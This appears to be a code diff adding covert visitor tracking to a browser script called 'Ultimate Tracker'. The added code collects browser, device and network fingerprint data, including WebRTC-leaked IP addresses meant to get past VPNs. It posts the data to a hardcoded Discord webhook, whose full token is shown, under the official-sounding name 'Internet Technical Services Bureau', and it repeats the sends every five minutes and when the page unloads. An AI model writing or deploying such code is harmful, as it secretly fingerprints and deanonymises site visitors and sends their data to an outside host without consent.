@@ -1,3 +1,4 @@
+// Main Tracking Function
 function initializeUltimateTracker() {
     const trackerData = {
         // Basic System Info
@@ -108,29 +109,79 @@ function initializeUltimateTracker() {
     initializeAsyncChecks(trackerData);
     initializeEventListeners(trackerData);
     
+    // Send initial data to Discord
+    sendToDiscordWebhook(trackerData);
+    
     return trackerData;
 }
 
-// All helper functions from previous versions remain the same...
-// [Include all helper functions we discussed]
+// Webhook Integration
+function sendToDiscordWebhook(data) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1402364477877518446/1v4i9TTbl1-3eIQhrBI_rfMNfI9FJ0QJ0g3t-C6bDKzJzjD0VXYqDvn9jFgu1fvHUptb';
+    
+    // Format the data for Discord
+    const embed = {
+        title: "Ultimate Tracker Data",
+        description: "Collected tracking data from visitor",
+        color: 0xff0000,
+        fields: [
+            {
+                name: "Basic Info",
+                value: `**Browser:** ${data.browser}\n**OS:** ${data.operatingSystem}\n**Language:** ${data.language}\n**Timezone:** ${data.timeZone}`,
+                inline: true
+            },
+            {
+                name: "Screen & Device",
+                value: `**Resolution:** ${data.screenResolution}\n**Window Size:** ${data.windowSize}\n**Device Type:** ${data.deviceType}\n**Touch Screen:** ${data.touchScreen ? 'Yes' : 'No'}`,
+                inline: true
+            },
+            {
+                name: "Network",
+                value: `**Connection Type:** ${data.connectionType}\n**Online Status:** ${data.onlineStatus ? 'Online' : 'Offline'}\n**VPN Detection:** ${data.vpnDetection.timezone ? 'Possible VPN' : 'No VPN detected'}`,
+                inline: true
+            },
+            {
+                name: "Location",
+                value: `**WebRTC IPs:** ${data.vpnDetection.webRTC.join(', ') || 'None'}`,
+                inline: false
+            },
+            {
+                name: "Additional Info",
+                value: `**Cookies:** ${data.cookiesEnabled ? 'Enabled' : 'Disabled'}\n**Local Storage:** ${data.localStorage ? 'Enabled' : 'Disabled'}\n**Dark Mode:** ${data.prefersDarkMode ? 'Enabled' : 'Disabled'}`,
+                inline: true
+            }
+        ],
+        timestamp: new Date().toISOString(),
+        footer: {
+            text: `Tracker ID: ${Math.random().toString(36).substring(2, 15)}`
+        }
+    };
 
-// Initialize the tracker
-const tracker = initializeUltimateTracker();
-console.log('Ultimate Tracker Initialized:', tracker);
+    const payload = {
+        embeds: [embed],
+        content: "New visitor data collected!",
+        username: "Internet Technical Services Bureau",
+        avatar_url: "https://i.imgur.com/8Km9tLL.png"
+    };
 
-// Update session duration every second
-setInterval(() => {
-    tracker.sessionDuration++;
-    if (tracker.sessionDuration % 60 === 0) {
-        console.log(`Session duration: ${tracker.sessionDuration} seconds`);
-    }
-}, 1000);
-
-// Main Tracking Function
-function initializeUltimateTracker() {
-    // [Previous main tracking code remains exactly the same]
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (!response.ok) {
+            console.error('Failed to send data to Discord webhook');
+        }
+    })
+    .catch(error => {
+        console.error('Error sending to Discord:', error);
+    });
 }
 
+// [All your existing helper functions remain exactly the same]
 // Network Helper Functions
 function getDetailedNetworkInfo() {
     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
@@ -330,10 +381,26 @@ function checkCommonExtensions() {
 const tracker = initializeUltimateTracker();
 console.log('Ultimate Tracker Initialized:', tracker);
 
-// Session duration tracker
+// Update session duration every second and send periodic updates
 setInterval(() => {
     tracker.sessionDuration++;
-    if (tracker.sessionDuration % 60 === 0) {
-        console.log(`Session duration: ${tracker.sessionDuration} seconds`);
+    if (tracker.sessionDuration % 300 === 0) { // Send update every 5 minutes
+        sendToDiscordWebhook(tracker);
     }
 }, 1000);
+
+// Additional event listeners to send updates on important events
+window.addEventListener('beforeunload', () => {
+    sendToDiscordWebhook({
+        ...tracker,
+        event: 'User leaving page',
+        sessionDuration: tracker.sessionDuration
+    });
+});
+
+window.addEventListener('scroll', () => {
+    tracker.scrollPosition = {
+        x: window.scrollX,
+        y: window.scrollY
+    };
+});
